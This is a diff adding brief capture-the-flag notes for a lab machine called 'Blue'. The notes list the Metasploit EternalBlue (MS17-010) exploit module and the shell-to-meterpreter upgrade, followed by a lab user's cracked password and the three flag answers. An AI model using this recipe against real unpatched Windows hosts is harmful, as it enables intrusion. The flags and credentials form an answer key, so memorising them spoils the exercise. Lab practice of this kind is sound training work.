@@ -1,0 +1,28 @@
+
+
+	                    Blue
+	
+                    yadhumanikandan
+
+-----------------------------------------------------------------------
+
+
+service ->      ms17-010
+
+exploit ->      exploit/windows/smb/ms17_010_eternalblue
+
+shell to meterpreter ->     post/multi/manage/shell_to_meterpreter
+
+user ->     jon
+
+password ->     alqfna22
+
+searched for files ->       search -f Flag*.txt
+
+flag1 ->        flag{access_the_machine}
+
+flag2 ->        flag{sam_database_elevated_access}
+
+flag3 ->        flag{admin_documents_can_be_valuable}
+
+---------------------------------------------------------------------------
